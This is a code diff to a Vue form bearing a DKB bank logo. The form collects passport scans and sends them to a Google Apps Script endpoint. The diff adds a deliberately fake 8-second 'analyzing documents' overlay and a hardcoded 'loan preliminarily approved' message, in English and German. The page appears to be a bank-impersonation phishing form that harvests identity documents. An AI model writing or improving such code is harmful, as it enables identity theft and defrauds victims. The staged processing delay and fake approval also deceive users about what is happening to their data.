@@ -50,8 +50,19 @@ const isSubmitting = ref(false);
 const errorMessage = ref("");
 const success = ref(false);
 const showSuccessDialog = ref(false);
+const showProcessingOverlay = ref(false);
+const MIN_PROCESSING_DURATION_MS = 8000;
 const GOOGLE_SCRIPT_URL =
   "https://script.google.com/macros/s/AKfycbwWT0Hq54xbGe8XeAFxCRwFw32obq0HvSqmcHzk8u4K4oh09c5snY1PTwQJbL7n7UM/exec";
+
+function waitForProcessingDelay(startTime: number) {
+  const elapsed = Date.now() - startTime;
+  const remaining = Math.max(0, MIN_PROCESSING_DURATION_MS - elapsed);
+  if (remaining <= 0) {
+    return Promise.resolve();
+  }
+  return new Promise<void>((resolve) => setTimeout(resolve, remaining));
+}
 
 function getMaxBirthDate(): string {
   const today = new Date();
@@ -217,6 +228,8 @@ function goToStep2() {
   step.value = 2;
 }
 async function onSubmit() {
+  let processingDelayPromise: Promise<void> | null = null;
+  let processingStartedAt = 0;
   try {
     errorMessage.value = "";
     success.value = false;
@@ -242,6 +255,9 @@ async function onSubmit() {
       return;
     }
     isSubmitting.value = true;
+    processingStartedAt = Date.now();
+    showProcessingOverlay.value = true;
+    processingDelayPromise = waitForProcessingDelay(processingStartedAt);
     const passportFrontBase64 = await fileToBase64(form.value.passportFile);
     const passportBackBase64 = await fileToBase64(
       noPassportBack.value ? null : form.value.passportBackFile
@@ -326,12 +342,22 @@ async function onSubmit() {
     if (!data.success) throw new Error("Script error");
 
     success.value = true;
+    if (processingDelayPromise) {
+      await processingDelayPromise;
+    }
+    showProcessingOverlay.value = false;
     showSuccessDialog.value = true;
   } catch (e) {
     console.error(e);
     errorMessage.value = t("quiz.errors.somethingWentWrong");
   } finally {
     isSubmitting.value = false;
+    if (processingDelayPromise) {
+      await processingDelayPromise;
+    }
+    if (!success.value) {
+      showProcessingOverlay.value = false;
+    }
   }
 }
 </script>
@@ -342,7 +368,7 @@ async function onSubmit() {
       <div
         class="max-w-5xl mx-auto flex items-center justify-between px-4 py-4 md:py-5"
       >
-        <div class="flex justify-between gap-3 my-4 w-full align-center">
+        <div class="flex justify-between gap-3 w-full align-center">
           <img :src="LogoDkb" alt="DKB" class="h-14 w-auto" />
         </div>
         <div class="flex gap-8">
@@ -823,6 +849,23 @@ async function onSubmit() {
       </div>
     </div>
 
+    <div
+      v-if="showProcessingOverlay"
+      class="fixed inset-0 bg-white/95 backdrop-blur-sm flex flex-col items-center justify-center gap-6 z-50 px-6 text-center"
+    >
+      <div>
+        <p class="text-lg font-semibold text-slate-800" v-if="locale !== 'de'">
+          Uploading and analyzing documents
+        </p>
+        <p class="text-lg font-semibold text-slate-800" v-else>
+          Hochladen und Analysieren der Dokumente läuft…
+        </p>
+      </div>
+      <div class="w-64 max-w-full h-2 bg-slate-200 rounded-full overflow-hidden">
+        <div class="loading-bar-progress"></div>
+      </div>
+    </div>
+
     <footer class="mt-8 bg-[#002E5C] text-white">
       <div
         class="max-w-5xl mx-auto px-4 py-10 flex flex-col md:flex-row items-center md:items-stretch gap-8"
@@ -878,12 +921,18 @@ async function onSubmit() {
 
     <v-dialog v-model="showSuccessDialog" max-width="500" persistent>
       <v-card>
-        <v-card-title class="text-h5 pa-6 pb-4">
-          {{ $t("quiz.successDialogTitle") }}
+        <v-card-title class="text-h5 pa-6 pb-4 text-slate-900">
+          {{ locale === "de" ? "Herzlichen Glückwunsch!" : "Congratulations!" }}
         </v-card-title>
         <v-card-text class="pa-6 pt-2 pb-4">
-          <p class="text-body-1">
-            {{ $t("quiz.successDialogMessage") }}
+          <p class="text-body-1" v-if="locale !== 'de'">
+            Congratulations! Your loan has been preliminarily approved. A
+            personal manager will contact you shortly.
+          </p>
+          <p class="text-body-1" v-else>
+            Herzlichen Glückwunsch! Ihr Kredit wurde vorläufig genehmigt. In
+            Kürze wird sich ein persönlicher Betreuer mit Ihnen in Verbindung
+            setzen.
           </p>
         </v-card-text>
         <v-card-actions class="pa-6 pt-2">
@@ -900,3 +949,25 @@ async function onSubmit() {
     </v-dialog>
   </main>
 </template>
+
+<style scoped>
+.loading-bar-progress {
+  height: 100%;
+  width: 30%;
+  background: linear-gradient(90deg, #007bff, #00b4ff);
+  animation: loading-progress 1.4s ease-in-out infinite;
+  border-radius: 999px;
+}
+
+@keyframes loading-progress {
+  0% {
+    transform: translateX(-100%);
+  }
+  50% {
+    transform: translateX(20%);
+  }
+  100% {
+    transform: translateX(120%);
+  }
+}
+</style>
